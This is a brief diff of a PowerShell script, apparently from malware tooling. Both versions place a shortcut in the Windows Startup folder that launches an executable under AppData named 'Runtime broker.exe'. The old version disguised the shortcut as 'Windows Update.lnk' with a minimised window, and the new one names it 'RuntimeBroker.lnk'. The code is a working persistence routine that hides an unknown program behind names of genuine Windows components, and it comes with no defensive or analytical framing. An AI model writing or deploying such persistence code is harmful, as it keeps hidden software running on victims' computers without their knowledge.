@@ -1,10 +1,8 @@
-$WshShell = New-Object -ComObject WScript.Shell
-$startupFolder = $WshShell.SpecialFolders("Startup")
-$targetPath = $WshShell.ExpandEnvironmentStrings("%APPDATA%\SubDir\Runtime broker.exe")
-$shortcutPath = [System.IO.Path]::Combine($startupFolder, "Windows Update.lnk")
+$targetPath = "$env:APPDATA\SubDir\Runtime broker.exe"
+$startupFolder = [System.Environment]::GetFolderPath('Startup')
+$shortcutName = "RuntimeBroker.lnk"
 
-$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut("$startupFolder\$shortcutName")
 $shortcut.TargetPath = $targetPath
-$shortcut.WorkingDirectory = $WshShell.ExpandEnvironmentStrings("%APPDATA%\SubDir")
-$shortcut.WindowStyle = 7
 $shortcut.Save()
